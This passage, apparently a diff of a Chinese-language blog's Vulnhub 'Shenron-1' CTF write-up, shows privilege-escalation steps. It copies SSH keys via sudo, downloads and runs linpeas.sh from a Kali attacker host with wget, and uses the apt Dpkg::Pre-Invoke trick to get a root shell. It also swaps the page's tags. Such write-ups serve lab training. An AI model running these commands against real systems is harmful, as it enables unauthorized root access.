-<p>3.接着我们进行执行权限查看，发现shenron用户可以使用复制命令，则刚好可以把jenny现在有的ssh密钥复制过去，免密登录shenron：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/24/Shenron-1/19.png" alt="image-"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cp /home/jenny/.ssh/authorized_keys /tmp/</span><br><span class="line">sudo -u shenron cp /tmp/authorized_keys /home/shenron/.ssh/</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/24/Shenron-1/20.png" alt="image-"></p>
-</blockquote>
-<h3><span id="root提权">root提权</span></h3><blockquote>
-<p>1.在&#x2F;var&#x2F;opt目录下，我们能发现password.txt，应该是shenron用户的密码：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Python3 -m http.server 8001，在kali开放http服务</span><br><span class="line">cd /tmp</span><br><span class="line">wget http://192.168.56.102:8001/linpeas.sh，使用linpeas.sh工具扫描</span><br><span class="line">chmod +x linpeas.sh</span><br><span class="line">./linpeas.sh | tee output</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/24/Shenron-1/21.png" alt="image-"></p>
-<p>2.在shenron用户基础上，再查看权限，发现所有用户都可以使用apt，则用apt进行提权（详见<a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/apt-get/%EF%BC%89%EF%BC%9A">https://gtfobins.github.io/gtfobins/apt-get/）：</a></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">TF=$(mktemp)</span><br><span class="line">echo &#x27;Dpkg::Pre-Invoke &#123;&quot;/bin/sh;false&quot;&#125;&#x27; &gt; $TF</span><br><span class="line">sudo apt install -c $TF sl</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/24/Shenron-1/22.png" alt="image-"></p>
-<p>3.在root用户&#x2F;root目录下，可以查看flag，即root.txt：</p>
-<p><img src="/2022/08/24/Shenron-1/23.png" alt="image-"></p>
-</blockquote>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/Shenron/" rel="tag">Shenron</a><a class="tag-none-link" href="/tags/Vulnhub/" rel="tag">Vulnhub</a><a class="tag-none-link" href="/tags/WriteUp/" rel="tag">WriteUp</a>
+                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Hard-Coding/" rel="tag">Hard Coding</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/WeChat/" rel="tag">WeChat</a>
             </div>
         
 
